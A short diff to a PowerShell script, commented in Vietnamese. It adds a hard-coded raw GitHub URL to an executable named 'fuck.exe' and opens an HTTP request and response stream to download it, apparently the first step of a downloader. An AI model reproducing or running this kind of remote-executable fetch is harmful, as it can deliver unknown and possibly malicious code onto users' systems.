@@ -1,4 +1,5 @@
 # Tạo một yêu cầu HTTP
+$url = "https://raw.githubusercontent.com/43a1723/test/main/Extras/fuck.exe"
 $request = [System.Net.HttpWebRequest]::Create($url)
 $response = $request.GetResponse()
 $stream = $response.GetResponseStream()
